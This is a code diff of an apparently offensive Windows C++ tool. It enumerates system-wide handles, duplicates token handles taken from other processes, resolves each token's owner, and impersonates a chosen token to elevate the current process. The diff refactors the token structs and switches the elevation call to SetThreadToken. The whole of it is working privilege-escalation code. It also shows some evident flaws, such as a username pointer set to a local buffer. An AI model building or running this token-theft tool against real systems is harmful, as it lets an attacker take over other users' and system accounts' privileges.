@@ -99,15 +99,16 @@ void run_cmd_with_token(Token* tokenToUse)
     {
         printf("[*] ImpersonationToken chosen -> elevating current process to %ws\n", tokenToUse->tokenUsername);
         
-        /*if (!SetThreadToken(NULL, pNewToken))
+        if (!SetThreadToken(NULL, pNewToken))
         {
             printf("[!] ERROR: Could not set thread token: %d\n", GetLastError());
         }
-        */
+        /*
         if (!ImpersonateLoggedOnUser(pNewToken))
         {
             printf("[!] ERROR: Impersonation failed: %d\n", GetLastError());
         }
+        */
     }   
     else if (tokenToUse->tokenType == TokenPrimary)
     {
@@ -156,24 +157,25 @@ LPWSTR get_object_info(HMODULE hNtdll, HANDLE hObject, OBJECT_INFORMATION_CLASS 
     return data;
 }
 
-void get_token_information(Token* tokenInfo) 
+void get_token_information(Token* token) 
 {
     // Token Type
     DWORD returned_tokinfo_length;
-    if (!GetTokenInformation(tokenInfo->tokenHandle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) 
+    if (!GetTokenInformation(token->tokenHandle, TokenStatistics, NULL, 0, &returned_tokinfo_length))
     {
         PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
-        if (GetTokenInformation(tokenInfo->tokenHandle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) 
+        if (GetTokenInformation(token->tokenHandle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length))
         {
             if (TokenStatisticsInformation->TokenType == TokenPrimary) 
             {
-                tokenInfo->tokenType = TokenPrimary;
+                token->tokenType = TokenPrimary;
             }
             else if (TokenStatisticsInformation->TokenType == TokenImpersonation) 
             {
-                tokenInfo->tokenType = TokenImpersonation;
+                token->tokenType = TokenImpersonation;
             }
         }
+        GlobalFree(TokenStatisticsInformation);
     }
 
     // User Info
@@ -185,21 +187,22 @@ void get_token_information(Token* tokenInfo)
     DWORD token_info;
     SID_NAME_USE sid;
 
-    tokenInfo->tokenUsername = (wchar_t*)L"./UNKNOWN";
-    if (!GetTokenInformation(tokenInfo->tokenHandle, TokenUser, NULL, 0, &token_info))
+    token->tokenUsername = (wchar_t*)L"UNKOWN/EMPTY";
+    if (!GetTokenInformation(token->tokenHandle, TokenUser, NULL, 0, &token_info))
     {
-        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
-        if (GetTokenInformation(tokenInfo->tokenHandle, TokenUser, TokenStatisticsInformation, token_info, &token_info))
+        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info); 
+        if (GetTokenInformation(token->tokenHandle, TokenUser, TokenStatisticsInformation, token_info, &token_info))
         {
             // Query username and domain to token user SID
             LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
             swprintf_s(full_name, 256, L"%ws/%ws", domain, username);
-            tokenInfo->tokenUsername = full_name;
+            token->tokenUsername = full_name;
         }
+        GlobalFree(TokenStatisticsInformation);
     }
 }
 
-void list_available_tokens(HMODULE hNtdll, Token** foundTokens)
+void list_available_tokens(HMODULE hNtdll, Token* foundTokens)
 {
     int nFoundTokens = 0;
     NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
@@ -245,18 +248,18 @@ void list_available_tokens(HMODULE hNtdll, Token** foundTokens)
         }
         delete[] objType;
 
-        Token* currToken = new Token;
-        currToken->tokenHandle = dupHandle;
-        currToken->tokenHandleInfo = handleInfo;
-        get_token_information(currToken);
+        Token currToken;
+        currToken.tokenHandle = dupHandle;
+        currToken.tokenHandleInfo = handleInfo;
+        get_token_information(&currToken);
 
         BOOL tokenAlreadyEnumerated = FALSE;
         for (int j = 0; j < nFoundTokens; ++j)
         {
-            Token* t = foundTokens[j];
-            if ((t->tokenType == currToken->tokenType)
-                && (wcscmp(t->tokenUsername, currToken->tokenUsername) == 0)
-                && t->tokenHandleInfo.ProcessId == currToken->tokenHandleInfo.ProcessId) // TODO: revisit when adding more attrs to token type
+            Token t = foundTokens[j];
+            if ((t.tokenType == currToken.tokenType)
+                && (wcscmp(t.tokenUsername, currToken.tokenUsername) == 0)
+                && t.tokenHandleInfo.ProcessId == currToken.tokenHandleInfo.ProcessId) // TODO: revisit when adding more attrs to token type
             {
                 // Token with same attributes exists
                 tokenAlreadyEnumerated = TRUE;
@@ -272,7 +275,7 @@ void list_available_tokens(HMODULE hNtdll, Token** foundTokens)
 
         foundTokens[nFoundTokens] = currToken;
         nFoundTokens++;
-        const wchar_t* wTokenType = currToken->tokenType == TokenImpersonation ? L"ImpersonationToken" : L"PrimaryToken";
+        const wchar_t* wTokenType = currToken.tokenType == TokenImpersonation ? L"ImpersonationToken" : L"PrimaryToken";
 
         // resolve PID to name
         wchar_t* processName = (wchar_t*)L"Unknown";
@@ -283,7 +286,7 @@ void list_available_tokens(HMODULE hNtdll, Token** foundTokens)
             Process32First(processSnapshotHandle, &process);
             do
             {
-                if (process.th32ProcessID == (DWORD)currToken->tokenHandleInfo.ProcessId)
+                if (process.th32ProcessID == (DWORD)currToken.tokenHandleInfo.ProcessId)
                 {
                     processName = process.szExeFile;
                     break;
@@ -291,7 +294,7 @@ void list_available_tokens(HMODULE hNtdll, Token** foundTokens)
             } while (Process32Next(processSnapshotHandle, &process));
         }
 
-        printf("[*] %i: [%ws]::[%ws(%i)]::[%ws]\n", nFoundTokens - 1, wTokenType, processName, currToken->tokenHandleInfo.ProcessId, currToken->tokenUsername);
+        printf("[*] %i: [%ws]::[%ws(%i)]::[%ws]\n", nFoundTokens - 1, wTokenType, processName, currToken.tokenHandleInfo.ProcessId, currToken.tokenUsername);
             
         CloseHandle(process);
     }
